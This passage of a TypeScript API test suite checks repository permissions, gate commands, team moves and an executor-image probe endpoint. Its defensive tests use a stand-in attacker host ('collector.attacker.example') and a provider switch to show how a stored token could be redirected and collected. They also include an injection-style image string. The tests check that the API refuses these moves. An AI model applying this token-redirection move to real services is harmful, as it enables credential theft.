        data: expect.objectContaining({
          action: 'UPDATE',
          actorId: 'lead-1',
          afterJson: { gateCommands: { runLint: 'pnpm lint' } },
          beforeJson: { gateCommands: { runTests: 'npm test' } },
          entityId: REPO_ID,
          entityType: 'Connection',
        }),
      });
    });

    it('stores a cleared set as null', async () => {
      stored({ runTests: 'npm test' });
      const res = await patch({ gateCommands: {} });
      expect(res.statusCode).toBe(200);
      expect(written().gateCommands).toBe(DB_NULL);
    });

    describe('onboarding with gate commands', () => {
      const onboard = (gateCommands: unknown) => {
        ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
        ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
        ctx.mockPrisma.connection.create.mockImplementationOnce(
          async ({ data }: { data: Record<string, unknown> }) => ({ ...data, id: REPO_ID })
        );
        return ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'POST',
          payload: { gateCommands, organizationName: 'acme', repoName: 'widgets', teamId: TEAM_ID },
          url: '/api/v1/repositories',
        });
      };
      const created = () =>
        (ctx.mockPrisma.connection.create.mock.calls.at(-1)?.[0] ?? { data: {} }) as {
          data: Record<string, unknown>;
        };

      it('refuses a team lead who is not the team admin', async () => {
        asTeamMember('LEAD');
        const res = await onboard({ runTests: 'npm test' });
        expect(res.statusCode).toBe(403);
        expect(JSON.parse(res.payload).error.code).toBe('GATE_COMMANDS_FORBIDDEN');
        expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
      });

      it('lets a team lead onboard with none, or with only blank ones', async () => {
        asTeamMember('LEAD');
        const res = await onboard({ runLint: '  ', runTests: null });
        expect(res.statusCode, res.payload).toBe(201);
        expect(created().data).not.toHaveProperty('gateCommands');
        expect(ctx.mockPrisma.configAuditLog.create).not.toHaveBeenCalled();
      });

      it('stores them for a team admin and audits them', async () => {
        asTeamMember('ADMIN');
        const res = await onboard({ runLint: '', runTests: 'npm test' });
        expect(res.statusCode, res.payload).toBe(201);
        expect(created().data.gateCommands).toEqual({ runTests: 'npm test' });
        expect(ctx.mockPrisma.configAuditLog.create).toHaveBeenCalledWith({
          data: expect.objectContaining({
            action: 'CREATE',
            afterJson: { gateCommands: { runTests: 'npm test' } },
            entityId: REPO_ID,
            entityType: 'Connection',
          }),
        });
      });
    });

    describe('moving the repository to another team', () => {
      const DEST = '44444444-4444-4444-8444-444444444444';
      const memberships = (dest: 'LEAD' | 'ADMIN') => {
        ctx.authState.role = 'LEAD';
        ctx.authState.sub = 'lead-1';
        ctx.mockPrisma.teamMembership.findUnique.mockImplementation(
          async ({ where }: { where: { userId_teamId: { teamId: string } } }) => ({
            role: where.userId_teamId.teamId === DEST ? dest : 'LEAD',
            team: { isActive: true },
          })
        );
        ctx.mockPrisma.team.findUnique.mockResolvedValue({ isActive: true, orgId: null });
      };

      it('refuses a lead of the destination who is not its admin when commands go with it', async () => {
        memberships('LEAD');
        stored({ runTests: 'npm test' });
        const res = await patch({ teamId: DEST });
        expect(res.statusCode).toBe(403);
        expect(JSON.parse(res.payload).error.message).toBe(
          'Moving a repository with gate commands requires team-admin role in the target team'
        );
        expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
      });

      it('lets an admin of the destination move it with its commands', async () => {
        memberships('ADMIN');
        stored({ runTests: 'npm test' });
        const res = await patch({ teamId: DEST });
        expect(res.statusCode, res.payload).toBe(200);
      });

      it('lets a lead move a repository that has no gate commands', async () => {
        memberships('LEAD');
        stored(null);
        const res = await patch({ teamId: DEST });
        expect(res.statusCode, res.payload).toBe(200);
      });
    });

    it('refuses an unknown gate, and gate commands on a connection that is not a repository', async () => {
      stored(null);
      const unknown = await patch({ gateCommands: { runDeploy: 'make deploy' } });
      expect(unknown.statusCode).toBe(400);

      stored(null, 'notion');
      const notGit = await patch({ gateCommands: { runTests: 'npm test' } });
      expect(notGit.statusCode).toBe(400);
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });
  });

  describe('a stored credential and a changed destination', () => {
    const patch = (payload: Record<string, unknown>) =>
      ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload,
        url: `/api/v1/repositories/${REPO_ID}`,
      });

    /** A Confluence connection holding a token, as the update route loads it. */
    const stored = (overrides: Record<string, unknown> = {}) => ({
      apiKeyCiphertext: Buffer.from('cipher'),
      config: { baseUrl: 'https://acme.atlassian.net', email: 'a@b.com' },
      id: REPO_ID,
      teamId: TEAM_ID,
      type: 'confluence',
      ...overrides,
    });

    it('refuses to send a stored token to another host', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue(stored());

      const res = await patch({
        config: { baseUrl: 'https://collector.attacker.example', email: 'a@b.com' },
      });

      // A LEAD cannot read the stored token, so repointing the row is how they would
      // collect it: the write must not happen at all.
      expect(res.statusCode).toBe(409);
      expect(JSON.parse(res.payload).error.code).toBe('TOKEN_ORIGIN_CHANGE');
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });

    it('refuses clearing the destination, which is the same move in two steps', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue(stored());

      const cleared = await patch({ config: null });

      expect(cleared.statusCode).toBe(409);
      expect(JSON.parse(cleared.payload).error.code).toBe('TOKEN_ORIGIN_CHANGE');
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });

    it('refuses a change that moves the token without touching the URL', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue(
        stored({
          config: { baseUrl: 'https://jira.corp', provider: 'jira' },
          type: 'issue_tracker',
        })
      );

      // Linear's endpoint is fixed, so this sends the Jira token to another service.
      const res = await patch({ config: { baseUrl: 'https://jira.corp', provider: 'linear' } });

      expect(res.statusCode).toBe(409);
      expect(JSON.parse(res.payload).error.code).toBe('TOKEN_ORIGIN_CHANGE');
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });

    it('permits the move when the caller supplies a new token', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue(stored());
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });

      const res = await patch({
        apiToken: 'a-new-token',
        config: { baseUrl: 'https://other.atlassian.net', email: 'a@b.com' },
      });

      expect(res.statusCode).toBe(200);
      expect(ctx.mockPrisma.connection.update).toHaveBeenCalled();
    });

    it('permits the move when the caller clears the stored token', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue(stored());
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });

      const res = await patch({
        apiToken: null,
        config: { baseUrl: 'https://other.atlassian.net', email: 'a@b.com' },
      });

      expect(res.statusCode).toBe(200);
      expect(ctx.mockPrisma.connection.update).toHaveBeenCalled();
    });

    it('permits an edit that keeps the host, and one on a row with no token', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue(stored());
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });

      const sameHost = await patch({
        config: { baseUrl: 'https://acme.atlassian.net/wiki', email: 'a@b.com' },
      });
      expect(sameHost.statusCode).toBe(200);

      ctx.mockPrisma.connection.findUnique.mockResolvedValue(stored({ apiKeyCiphertext: null }));
      const noToken = await patch({ config: { baseUrl: 'https://anywhere.example' } });
      expect(noToken.statusCode).toBe(200);
    });
  });

  describe('PATCH /api/v1/repositories/:id', () => {
    it('updates the repository and returns the new row', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });
      ctx.mockPrisma.connection.update.mockResolvedValueOnce({
        description: 'updated',
        id: REPO_ID,
        teamId: TEAM_ID,
      });

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload: { description: 'updated' },
        url: `/api/v1/repositories/${REPO_ID}`,
      });

      expect(res.statusCode).toBe(200);
      expect(JSON.parse(res.payload).data.description).toBe('updated');
      expect(ctx.mockPrisma.connection.update).toHaveBeenCalled();
    });

    it('rejects reassignment when governed knowledge exists on the locked repository', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValueOnce({
        apiKeyAuthTag: null,
        apiKeyCiphertext: null,
        apiKeyNonce: null,
        apiKeyVersion: 1,
        id: REPO_ID,
        team: { orgId: 'org-1' },
        teamId: TEAM_ID,
        type: 'git_repo',
      });
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ isActive: true });
      ctx.mockPrisma.knowledgeItem.count.mockResolvedValueOnce(1);
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload: { teamId: '44444444-4444-4444-8444-444444444444' },
        url: `/api/v1/repositories/${REPO_ID}`,
      });
      expect(res.statusCode, res.payload).toBe(409);
      expect(JSON.parse(res.payload).error.code).toBe('KNOWLEDGE_SOURCE_IN_USE');
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });

    it('returns 404 when the repository does not exist', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValueOnce(null);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload: { description: 'updated' },
        url: `/api/v1/repositories/${REPO_ID}`,
      });

      expect(res.statusCode).toBe(404);
      expect(JSON.parse(res.payload).error.code).toBe('REPO_NOT_FOUND');
    });

    it('returns 403 for a non-ADMIN who does not lead the repository’s current team', async () => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.connection.findUnique.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValueOnce(null);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload: { description: 'nope' },
        url: `/api/v1/repositories/${REPO_ID}`,
      });

      expect(res.statusCode).toBe(403);
      expect(JSON.parse(res.payload).error.code).toBe('FORBIDDEN');
    });

    it('returns 400 for a malformed :id param', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload: { description: 'x' },
        url: '/api/v1/repositories/not-a-uuid',
      });
      expect(res.statusCode).toBe(400);
    });
  });

  describe('POST /api/v1/repositories/:id/executor-image/probe', () => {
    const PROBE_RESULT = {
      checks: [{ detail: 'ok', name: 'git', ok: true, required: true }],
      image: 'node:24-alpine',
      ok: true,
    };

    beforeEach(() => {
      ctx.mockTemporal.probeExecutorImage.mockReset().mockResolvedValue(PROBE_RESULT);
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        executorImage: 'ghcr.io/acme/exec:1',
        type: 'git_repo',
      });
    });

    it('probes the repo’s executorImage by default and returns the checks', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: {},
        url: `/api/v1/repositories/${REPO_ID}/executor-image/probe`,
      });
      expect(res.statusCode).toBe(200);
      expect(JSON.parse(res.payload).data).toEqual(PROBE_RESULT);
      const [workflowId, input] = ctx.mockTemporal.probeExecutorImage.mock.calls[0] as [
        string,
        { image?: string },
      ];
      expect(workflowId).toContain(`executor-image-probe-${REPO_ID}`);
      expect(input).toEqual({ image: 'ghcr.io/acme/exec:1' });
    });

    it('sends no image when the repo has none (the worker resolves its default)', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        executorImage: null,
        type: 'git_repo',
      });
      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: {},
        url: `/api/v1/repositories/${REPO_ID}/executor-image/probe`,
      });
      expect(ctx.mockTemporal.probeExecutorImage.mock.calls[0]?.[1]).toEqual({
        image: undefined,
      });
    });

    it('honours an explicit image in the body', async () => {
      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: { image: 'debian:stable-slim' },
        url: `/api/v1/repositories/${REPO_ID}/executor-image/probe`,
      });
      expect(ctx.mockTemporal.probeExecutorImage.mock.calls[0]?.[1]).toEqual({
        image: 'debian:stable-slim',
      });
    });

    it('rejects a non-image string', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: { image: 'not an image;;' },
        url: `/api/v1/repositories/${REPO_ID}/executor-image/probe`,
      });
      expect(res.statusCode).toBe(400);
      expect(ctx.mockTemporal.probeExecutorImage).not.toHaveBeenCalled();
    });

    it('is ADMIN only', async () => {
      for (const role of ['LEAD', 'ENGINEER'] as const) {
        ctx.authState.role = role;
        const res = await ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'POST',
          payload: {},
          url: `/api/v1/repositories/${REPO_ID}/executor-image/probe`,
        });
        expect(res.statusCode).toBe(403);
      }
      expect(ctx.mockTemporal.probeExecutorImage).not.toHaveBeenCalled();
    });

    it('404s when the repository does not exist', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue(null);
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: {},
        url: `/api/v1/repositories/${REPO_ID}/executor-image/probe`,
      });
      expect(res.statusCode).toBe(404);
    });
  });
});
